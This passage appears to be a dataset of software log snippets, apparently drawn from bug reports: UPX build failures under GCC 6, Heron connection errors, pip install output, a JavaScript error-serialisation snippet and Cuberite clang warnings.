p_vmlinz.o -c p_vmlinz.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o p_w16ne.o -c p_w16ne.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o p_w32pe.o -c p_w32pe.cpp\r\np_vmlinx.cpp: In static member function \u2018static int PackVmlinuxBase<TElfClass>::compare_Phdr(const void*, const void*)\u2019:\r\np_vmlinx.cpp:100:5: error: this \u2018if\u2019 clause does not guard... [-Werror=misleading-indentation]\r\n     if (a->p_paddr > b->p_paddr) return  1;\r\n     ^~\r\np_vmlinx.cpp:101:34: note: ...this statement, but the latter is misleadingly indented as if it is guarded by the \u2018if\u2019\r\n                                  return  0;\r\n                                  ^~~~~~\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o p_w64pep.o -c p_w64pep.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o p_wcle.o -c p_wcle.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o packer.o -c packer.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o packer_c.o -c packer_c.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o packer_f.o -c packer_f.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o packhead.o -c packhead.cpp\r\n"
    },
    {
        "logs": "```console\r\nusername_0@tornado:~/src/ext/mxe$ MXE_VERBOSE=1 make upx\r\n[using autodetected 6 job(s)]\r\n[build]     upx                    x86_64-unknown-linux-gnu                                               \r\n\r\nFailed to build package upx for target x86_64-unknown-linux-gnu!\r\n------------------------------------------------------------\r\nmake[1]: Entering directory '/home/username_0/src/ext/mxe'\r\nuname -a\r\nLinux tornado 4.5.4-1-ARCH #1 SMP PREEMPT Wed May 11 22:21:28 CEST 2016 x86_64 GNU/Linux\r\ngit log --pretty=tformat:\"%H - %s [%ar] [%d]\" -1\r\n28dd97f3902fcb664c28255a2773839a4a897a2a - gcc6: fix compiling ucl [22 minutes ago] [ (HEAD -> ucl-fix, origin/ucl-fix)]\r\nlsb_release -a 2>/dev/null || sw_vers 2>/dev/null || true\r\nautoconf --version 2>/dev/null | head -1\r\nautoconf (GNU Autoconf) 2.69\r\nautomake --version 2>/dev/null | head -1\r\nautomake (GNU automake) 1.15\r\ngcc --version\r\ngcc (GCC) 6.1.1 20160501\r\nCopyright (C) 2016 Free Software Foundation, Inc.\r\nThis is free software; see the source for copying conditions.  There is NO\r\nwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\r\ng++ --version\r\ng++ (GCC) 6.1.1 20160501\r\nCopyright (C) 2016 Free Software Foundation, Inc.\r\nThis is free software; see the source for copying conditions.  There is NO\r\nwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.\r\npython --version\r\nPython 3.5.1\r\nperl --version 2>&1 | head -3\r\nThis is perl 5, version 22, subversion 2 (v5.22.2) built for x86_64-linux-thread-multi\r\nrm -rf   '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu'\r\nmkdir -p '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu'\r\ncd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu' &&    tar xjf '/home/username_0/src/ext/mxe/pkg/upx-3.91-src.tar.bz2'\r\ncd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src'\r\n(cd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src' && patch -p1 -u) < /home/username_0/src/ext/mxe/src/upx-1-fix-logging.patch\r\npatching file src/c_init.cpp\r\npatching file src/console.h\r\ncd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src' &&  tar xzf '/home/username_0/src/ext/mxe/pkg/ucl-1.03.tar.gz'\r\ncd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03'\r\n(cd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03' && patch -p1 -u) < /home/username_0/src/ext/mxe/src/ucl-1-fixes.patch\r\npatching file acc/acclib/uclock.ch\r\npatching file configure\r\nmkdir '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma'\r\ncd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma' &&    tar xjf '/home/username_0/src/ext/mxe/pkg/lzma920.tar.bz2'\r\ncd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma/.'\r\n(cd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma/.' && patch -p1 -u) < /home/username_0/src/ext/mxe/src/lzma-1-include-stdio.h.patch \r\npatching file CPP/7zip/Common/FileStreams.cpp\r\n(cd '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma/.' && patch -p1 -u) < /home/username_0/src/ext/mxe/src/lzma-2-mystring-include-windows.patch\r\npatching file CPP/Common/MyString.h\r\nUPX_UCLDIR='/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03' UPX_LZMADIR='/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma' UPX_LZMA_VERSION=0x920 make -C '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src' -j '6' all 'CXX=g++' 'CC=gcc' 'PKG_CONFIG=/home/username_0/src/ext/mxe/usr/x86_64-unknown-linux-gnu/bin/pkgconf' 'LIBS=-L/home/username_0/src/ext/mxe/usr/x86_64-unknown-linux-gnu/lib -lucl -lz' 'exeext=.exe'\r\nmake[2]: Entering directory '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src'\r\nmake -C src all\r\nmake[3]: Entering directory '/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/src'\r\nUpdating .depend\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o c_file.o -c c_file.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o c_init.o -c c_init.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o c_none.o -c c_none.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o c_screen.o -c c_screen.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o compress.o -c compress.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -Wno-cast-qual -Wno-shadow -Wno-error -o compress_lzma.o -c compress_lzma.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o compress_ucl.o -c compress_ucl.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o compress_zlib.o -c compress_zlib.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o except.o -c except.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o file.o -c file.cpp\r\nIn file included from compress_lzma.cpp:236:0:\r\n/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma/C/LzmaEnc.c: In function \u2018SRes LzmaEnc_Alloc(CLzmaEnc*, UInt32, ISzAlloc*, ISzAlloc*)\u2019:\r\n/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma/C/LzmaEnc.c:1900:8: warning: variable \u2018btMode\u2019 set but not used [-Wunused-but-set-variable]\r\n   Bool btMode;\r\n        ^~~~~~\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o filter.o -c filter.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o filteri.o -c filteri.cpp\r\n[Truncated]\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o p_tos.o -c p_tos.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o p_unix.o -c p_unix.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o p_vmlinx.o -c p_vmlinx.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o p_vmlinz.o -c p_vmlinz.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o p_w16ne.o -c p_w16ne.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o p_w32pe.o -c p_w32pe.cpp\r\np_vmlinx.cpp: In static member function \u2018static int PackVmlinuxBase<TElfClass>::compare_Phdr(const void*, const void*)\u2019:\r\np_vmlinx.cpp:100:5: error: this \u2018if\u2019 clause does not guard... [-Werror=misleading-indentation]\r\n     if (a->p_paddr > b->p_paddr) return  1;\r\n     ^~\r\np_vmlinx.cpp:101:34: note: ...this statement, but the latter is misleadingly indented as if it is guarded by the \u2018if\u2019\r\n                                  return  0;\r\n                                  ^~~~~~\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o p_w64pep.o -c p_w64pep.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o p_wcle.o -c p_wcle.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o packer.o -c packer.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o packer_c.o -c packer_c.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o packer_f.o -c packer_f.cpp\r\ng++ -DWITH_LZMA=0x920 -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/ucl-1.03/include -I/home/username_0/src/ext/mxe/tmp-upx-x86_64-unknown-linux-gnu/upx-3.91-src/lzma -O2 -Wall -W -Wcast-align -Wcast-qual -Wpointer-arith -Wshadow -Wwrite-strings -Werror -o packhead.o -c packhead.cpp\r\n"
    },
    {
        "logs": "`\r\n[2016-05-31 14:52:14 +0530] com.twitter.heron.common.network.HeronClient SEVERE:  Failed to FinishConnect to endpoint: /127.0.0.1:50171 \r\njava.net.ConnectException: Connection refused\r\n\tat sun.nio.ch.SocketChannelImpl.checkConnect(Native Method)\r\n\tat sun.nio.ch.SocketChannelImpl.finishConnect(SocketChannelImpl.java:740)\r\n\tat com.twitter.heron.common.network.HeronClient.handleConnect(HeronClient.java:244)\r\n\tat com.twitter.heron.common.basics.NIOLooper.handleSelectedKeys(NIOLooper.java:115)\r\n\tat com.twitter.heron.common.basics.NIOLooper.access$000(NIOLooper.java:32)\r\n\tat com.twitter.heron.common.basics.NIOLooper$1.run(NIOLooper.java:45)\r\n\tat com.twitter.heron.common.basics.WakeableLooper.executeTasksOnWakeup(WakeableLooper.java:142)\r\n\tat com.twitter.heron.common.basics.WakeableLooper.runOnce(WakeableLooper.java:74)\r\n\tat com.twitter.heron.common.basics.WakeableLooper.loop(WakeableLooper.java:64)\r\n\tat com.twitter.heron.instance.Gateway.run(Gateway.java:155)\r\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)\r\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)\r\n\tat java.lang.Thread.run(Thread.java:745)\r\n"
    },
    {
        "logs": "`\r\nFile \"heron-executor.stdout\" reports the following error - \r\n2016-05-31 17:36:57: Running container_1_word_2 process as /usr/lib/jvm/default-java/bin/java -Xmx320M -Xms320M -Xmn160M -XX:MaxPermSize=128M -XX:PermSize=128M -XX:ReservedCodeCacheSize=64M -XX:+CMSScavengeBeforeRemark -XX:TargetSurvivorRatio=90 -XX:+PrintCommandLineFlags -verbosegc -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps -XX:+PrintGCCause -XX:+PrintPromotionFailure -XX:+PrintTenuringDistribution -XX:+PrintHeapAtGC -XX:+HeapDumpOnOutOfMemoryError -XX:+UseConcMarkSweepGC -XX:ParallelGCThreads=4 -Xloggc:log-files/gc.container_1_word_2.log -XX:+HeapDumpOnOutOfMemoryError -Djava.net.preferIPv4Stack=true -cp ./heron-core/lib/instance/*:heron-examples.jar com.twitter.heron.instance.HeronInstance ExclamationTopology ExclamationTopology4dd1e087-a0cf-4ea5-9e87-4217c412c646 container_1_word_2 word 2 0 stmgr-1 58491 50621 ./heron-conf/heron_internals.yaml\r\n"
    },
    {
        "logs": "`2016-05-31 17:36:57: Running container_1_exclaim1_1 process as /usr/lib/jvm/default-java/bin/java -Xmx320M -Xms320M -Xmn160M -XX:MaxPermSize=128M -XX:PermSize=128M -XX:ReservedCodeCacheSize=64M -XX:+CMSScavengeBeforeRemark -XX:TargetSurvivorRatio=90 -XX:+PrintCommandLineFlags -verbosegc -XX:+PrintGCDetails -XX:+PrintGCTimeStamps -XX:+PrintGCDateStamps -XX:+PrintGCCause -XX:+PrintPromotionFailure -XX:+PrintTenuringDistribution -XX:+PrintHeapAtGC -XX:+HeapDumpOnOutOfMemoryError -XX:+UseConcMarkSweepGC -XX:ParallelGCThreads=4 -Xloggc:log-files/gc.container_1_exclaim1_1.log -XX:+HeapDumpOnOutOfMemoryError -Djava.net.preferIPv4Stack=true -cp ./heron-core/lib/instance/*:heron-examples.jar com.twitter.heron.instance.HeronInstance ExclamationTopology ExclamationTopology4dd1e087-a0cf-4ea5-9e87-4217c412c646 container_1_exclaim1_1 exclaim1 1 0 stmgr-1 58491 50621 ./heron-conf/heron_internals.yaml\r\n"
    },
    {
        "logs": "`Installing collected packages: ConfigArgParse, click, MarkupSafe, Jinja2, Werkzeug, itsdangerous, Flask, termcolor, pyparsing, packaging, deprecation, iso8601, pbr, stevedore, keystoneauth1, os-service-types, munch, netifaces, futures, appdirs, requestsexceptions, jmespath, jsonpointer, jsonpatch, dogpile.cache, openstacksdk, bcrypt, asn1crypto, cryptography, pynacl, paramiko, spur, python-dateutil, pyasn1-modules, rsa, httplib2, oauth2client, kubernetes, powerfulseal\r\n"
    },
    {
        "logs": "`Successfully installed ConfigArgParse-0.13.0 Flask-0.12.2 Jinja2-2.10 MarkupSafe-1.0 Werkzeug-0.14.1 appdirs-1.4.3 asn1crypto-0.24.0 bcrypt-3.1.4 click-6.7 cryptography-2.2.2 deprecation-2.0.2 dogpile.cache-0.6.5 futures-3.2.0 httplib2-0.11.3 iso8601-0.1.12 itsdangerous-0.24 jmespath-0.9.3 jsonpatch-1.23 jsonpointer-2.0 keystoneauth1-3.5.0 kubernetes-1.0.2 munch-2.3.1 netifaces-0.10.6 oauth2client-4.1.2 openstacksdk-0.12.0 os-service-types-1.2.0 packaging-17.1 paramiko-2.4.1 pbr-4.0.2 powerfulseal-1.1.1 pyasn1-modules-0.2.1 pynacl-1.2.1 pyparsing-2.2.0 python-dateutil-2.7.2 requestsexceptions-1.4.0 rsa-3.4.2 spur-0.3.20 stevedore-1.28.0 termcolor-1.1.0\r\n"
    },
    {
        "logs": "`javascript\r\nconst simpleError = {\r\n\tmessage: this.message,\r\n};\r\nif (process.env.NODE_ENV !== 'production') {\r\n\tsimpleError.stack = this.stack;\r\n}\r\nreturn simpleError;\r\n"
    },
    {
        "logs": "```javascript\r\nconst simpleError = {\r\n\tmessage: this.message,\r\n};\r\nif (process.env.NODE_ENV !== 'production') {\r\n\tsimpleError.stack = this.stack;\r\n}\r\nreturn simpleError;\r\n"
    },
    {
        "logs": "`\r\n[ 50%] Building CXX object src/Bindings/CMakeFiles/Bindings.dir/Bindings.cpp.o\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:338:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:351:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:368:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:381:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:398:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:411:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:553:86: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<float>* a_Rhs = ((const Vector3<float>*)  tolua_tousertype(tolua_S,2,0));\r\n                                                                                     ^\r\n                                                                                     nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:578:86: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<float>* a_Rhs = ((const Vector3<float>*)  tolua_tousertype(tolua_S,2,0));\r\n                                                                                     ^\r\n                                                                                     nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:604:88: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<double>* a_Rhs = ((const Vector3<double>*)  tolua_tousertype(tolua_S,2,0));\r\n                                                                                       ^\r\n                                                                                       nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:629:88: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<double>* a_Rhs = ((const Vector3<double>*)  tolua_tousertype(tolua_S,2,0));\r\n                                                                                       ^\r\n                                                                                       nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:655:82: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* a_Rhs = ((const Vector3<int>*)  tolua_tousertype(tolua_S,2,0));\r\n                                                                                 ^\r\n                                                                                 nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:680:82: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* a_Rhs = ((const Vector3<int>*)  tolua_tousertype(tolua_S,2,0));\r\n                                                                                 ^\r\n                                                                                 nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:710:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:744:68: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  Vector3<int>* self = (Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                   ^\r\n                                                                   nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:775:80: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* self = (const Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                               ^\r\n                                                                               nullptr\r\n/Users/alpine/cuberite/src/Bindings/Bindings.cpp:817:80: error: zero as null pointer constant [-Werror,-Wzero-as-null-pointer-constant]\r\n  const Vector3<int>* self = (const Vector3<int>*)  tolua_tousertype(tolua_S,1,0);\r\n                                                                               ^\r\n                                                                               